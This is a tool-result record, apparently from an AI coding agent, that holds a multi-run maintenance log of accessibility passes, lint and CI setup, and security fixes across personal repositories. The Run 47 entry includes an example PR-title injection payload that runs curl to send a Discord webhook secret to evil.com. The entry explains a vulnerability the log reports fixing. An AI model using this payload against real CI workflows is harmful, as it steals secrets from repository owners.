{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_0136c7dYpyGA9yRcMJijoSSa","type":"tool_result","content":"- Result: 0 lint errors, 0 type errors, 136 tests passing, build clean\n\n### Survey findings (for future sessions)\n- **social-tools**: Now fully accessible. All Tier 1-3 features complete, 136 tests, CI with lint/check/test/build/smoke.\n- **groceryGenius**: Already has standalone ESLint (Vite project, not Next.js — previous note was incorrect). Already had WCAG pass (Run 40).\n- **promptlibrary**: Already had WCAG pass (Run 41) and ESLint (Run 42).\n- **Remaining a11y opportunities**: runeval (main product, no a11y pass yet), valueSortify, pezantTools\n- **All repos**: Clean audit (except known unfixable transitive deps), tests passing, CI active, branches clean\n\n---\n\n## 2026-03-20 — Run 45\n\n### What was done\n\n**runeval — Comprehensive WCAG accessibility pass (PRs #42-#44, auto-merged)**\n- **Layout**: Added skip-to-content link, `aria-label=\"Main navigation\"` on nav, single `<main id=\"main-content\">` landmark in root layout, replaced nested `<main>` tags with `<div>` across 16 page files, `aria-hidden` on decorative nav separator\n- **DashboardClient**: `role=\"group\"` with `aria-label=\"Activity filter\"` on filter pills, `aria-pressed` on each pill, `aria-busy` on sync button, `role=\"alert\"` on sync error, `aria-label=\"Dismiss notification\"` on dismiss button, `aria-hidden` on decorative spinner and green status dot\n- **HealthDashboard**: `role=\"group\"` with `aria-label=\"Date range\"` on range pills, `aria-pressed` on each pill, `aria-expanded` and `aria-label` on all metric summary cards (both primary and overflow), `aria-hidden` on emoji icons and green dots, `aria-label` on close button, `role=\"img\"` with descriptive label on SparklineChart\n- **ActivityReportClient**: `aria-label=\"Compare with another activity\"` on select, `aria-busy` on AI report generation button, `role=\"status\"` on email confirmation\n- **StreamChart**: `role=\"img\"` with descriptive `aria-label` (includes min/avg/max stats) on SVG element\n- **ZoneBars**: `role=\"img\"` with zone distribution `aria-label`, `aria-hidden` on visual bar elements\n- **Imports page**: `role=\"button\"` + `tabIndex` + keyboard support (Enter/Space) on expandable job rows, `aria-expanded` on expandable rows, `aria-label` on delete buttons, `role=\"alert\"` on upload errors, `role=\"status\"` on success messages, `aria-hidden` on arrow indicators\n- **Auth pages** (login, register, forgot-password, reset-password): `role=\"alert\"` on all error messages, `role=\"status\"` on success messages, `aria-hidden` on Google OAuth SVG\n- **Settings page**: `role=\"status\"` on save feedback, `aria-hidden` on green connection dot\n- Result: 0 lint errors, 0 type errors, 129 tests passing, build clean\n- Deployed to staging — 308 (auth redirect, app running correctly)\n\n### Survey findings (for future sessions)\n- **runeval**: Now has WCAG accessibility pass. All major repos now accessible (groceryGenius Run 40, promptlibrary Run 41, social-tools Run 44, runeval Run 45)\n- **Remaining a11y opportunities**: valueSortify, pezantTools (lower priority — simpler apps)\n- **All repos**: Clean audit, tests passing, CI active, branches clean\n\n---\n\n## 2026-03-20 — Run 46\n\n### What was done\n\n**valueSortify — WCAG accessibility pass (PR #23, auto-merged)**\n- **DraggableCard**: Removed broken keyboard drag handler (`controls.start(e)` requires pointer events, keyboard events thrown away by framer-motion), marked drag handle `aria-hidden`, added first-letter text labels (V/I/N) inside color-only category move buttons so color-blind users can distinguish targets\n- **GridView**: Wrapped `ValueCard` items in `role=\"listitem\"` elements to complete `role=\"list\"` semantics\n- **ResultsPhase**: Added Escape key and click-outside handlers to close export dropdown menu, added reset confirmation dialog (matching sorting/ranking phases — previously \"Start Over\" had no confirmation), `aria-hidden` on decorative Trophy icon\n- **SingleCardView**: Replaced hardcoded `aria-valuemax={83}` with dynamic `totalValues` prop passed from parent\n- **SortingPhase**: Added `aria-label` to view toggle button, `aria-hidden` on decorative Lucide icons (Layers, LayoutGrid, CreditCard, ArrowRight, RotateCcw)\n- **RankingPhase**: `aria-hidden` on decorative Lucide icons (RotateCcw, ArrowLeft, Trophy)\n- Result: 0 lint errors, 38 tests passing, build clean\n\n### Survey findings (for future sessions)\n- **valueSortify**: Now has WCAG accessibility pass. All major + mid-tier repos now accessible (groceryGenius Run 40, promptlibrary Run 41, social-tools Run 44, runeval Run 45, valueSortify Run 46)\n- **Remaining a11y opportunity**: pezantTools (server-rendered EJS templates — different approach needed)\n- **All repos**: Clean audit (except known unfixable transitive deps), tests passing, CI active, branches clean\n\n---\n\n## 2026-03-20 — Run 47\n\n### What was done\n\n**Cross-repo security fix: GHA script injection in PR Discord notification workflow (15 PRs merged)**\n\nThe `pr-notify.yml` workflow deployed to all 15 repos had a script injection vulnerability. PR title, body, URL, and author were interpolated directly into the shell `run:` block via `${{ github.event.pull_request.* }}` expressions. An attacker could craft a malicious PR title (e.g. `\"; curl http://evil.com?t=$MERGE_WEBHOOK #`) to execute arbitrary commands and exfiltrate Discord webhook secrets.\n\n**Fix applied to all 15 repos:**\n- groceryGenius (#58), pezantTools (#58), promptlibrary (#23), runeval (#45), youtubeSpeedSetAndRemember (#17), job-scraper (#11), activity-tracker (#5), valueSortify (#24), llm-tasks (#50), scripts (#12), waymo-sim (#11), llm-context (#1), runCoach (#1), reddit-bottom-sheet-blocker (#4), social-tools (#46)\n\n**Changes:**\n1. Moved all `github.event.pull_request.*` expressions from the shell `run:` block into `env:` variables — the standard mitigation for GHA script injection\n2. Replaced heredoc string interpolation for JSON payload with `jq -n --arg`, which properly escapes special characters and prevents JSON injection\n\n### Survey findings (for future sessions)\n- **pezantTools**: No ESLint configured, hardcoded fallback session secret in server.js\n- **activity-tracker**: No ESLint configured, has real daemon logic across multiple files\n- **reddit-bottom-sheet-blocker**: MutationObserver fires storage read on every DOM mutation (perf concern), placeholder Firefox extension ID, binary zip committed\n- **waymo-sim**: No Python linter (ruff/flake8/mypy), unpinned deps in requirements.txt\n\n---\n\n## 2026-03-20 — Run 48\n\n### What was done\n\n**pezantTools — Security fix + ESLint setup (PR #59, auto-merged)**\n\n1. **Removed hardcoded session secret:** The `express-session` middleware had a fallback `'pezant-tools-fallback-secret'` when `SESSION_SECRET` env var was missing. Now the app exits with a clear error if the variable isn't set, preventing use of a predictable secret in production.\n\n2. **Fixed `bucket` scoping bug:** In `serveProjectIndex()`, the GCS `bucket` variable was declared inside an `else` block but used outside it for metadata loading. When serving local projects, this caused a `ReferenceError`. Hoisted the declaration to function scope.\n\n3. **Added ESLint v10:** Flat config for CommonJS Node.js, `no-unused-vars` with underscore-prefixed exceptions for args/catch vars, `no-undef` for catching undefined references. Fixed 5 lint errors (unused `PROJECT_DEFAULTS` import, 3 unused catch vars, the bucket scoping bug).\n\n4. **Added lint to CI:** ESLint now runs before build in the CI workflow.\n\n**pezantTools — CI fix: Node 18 → 20/22 (PR #62, auto-merged)**\n\nTailwind CSS v4's native oxide binary doesn't support Node 18, causing CI build failures since the v4 migration (Run 38). Updated CI matrix from Node 18/20 to 20/22 and engines field to `>=20.0.0`. CI now passes on both versions.\n\n### Survey findings (for future sessions)\n- **activity-tracker**: No ESLint configured, has real daemon logic across multiple files\n- **reddit-bottom-sheet-blocker**: MutationObserver fires storage read on every DOM mutation (perf concern), placeholder Firefox extension ID, binary zip committed\n- **waymo-sim**: No Python linter (ruff/flake8/mypy), unpinned deps in requirements.txt","is_error":false}]},"parent_tool_use_id":"toolu_018A3My8b4BsyLydkYUMKYB2","session_id":"b9d12ae6-7237-4f47-af1a-e8ee6ae9d749","uuid":"d7ae8cb0-436a-468a-af00-99ac7feb93e7","timestamp":"2026-03-20T15:01:03.568Z"}
